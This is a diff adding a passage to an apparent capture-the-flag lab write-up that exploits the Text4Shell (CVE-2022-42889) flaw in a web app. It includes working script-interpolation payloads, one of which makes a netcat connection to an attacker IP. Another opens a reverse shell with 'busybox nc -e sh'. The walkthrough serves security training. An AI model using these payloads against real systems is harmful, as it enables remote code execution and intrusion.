@@ -198,6 +198,60 @@ Navigate to the webpage
 
 `3`
 
+This is a page under maintenance, but then we get a "welcome Guest" message, lets see if we can change users
+
+`4`
+
+We have a "welcome default" now, lets see if we can change that default to say "BlackAnon"
+
+`5`
+
+It worked, the name of this lab actually pointed us to the vulnerability
+
+When you paste "Text4Shell" on Google, you get this
+
+`6`
+
+We can see it has its own cve code, well lets exploit hehe
+
+
+## Exploitation
+
+You can read more about the exploit [here](https://medium.com/mii-cybersec/cve-2022-42889-text4shell-vulnerability-17b703a48dcd)
+
+So we'll be using this payload ```${script:javascript:java.lang.Runtime.getRuntime().exec('payload')}```
+
+First lets try to check if I can get a connection back to my machine, we can use netcat for this
+
+payload:```$%7Bscript:javascript:java.lang.Runtime.getRuntime().exec('nc%2010.8.0.3%201234')%7D```
+
+Ensure you edit the ```IP``` and ```PORT``` number
+
+Also, ensure you set up your netcat listener to the port number you used
+
+Using the payload
+
+`7`
+
+Checking my netcat listener
+
+`8`
+
+I got a connection, lets go ahead to get a reverse shell
+
+payload:```$%7Bscript:javascript:java.lang.Runtime.getRuntime().exec('busybox%20nc%2010.8.0.3%201234%20-e%20sh')%7D```
+
+`9`
+
+Checking my netcat listener
+
+`10`
+
+We got a reverse shell hehe, lets stabilize this
+
+
+
+  
 
 
 
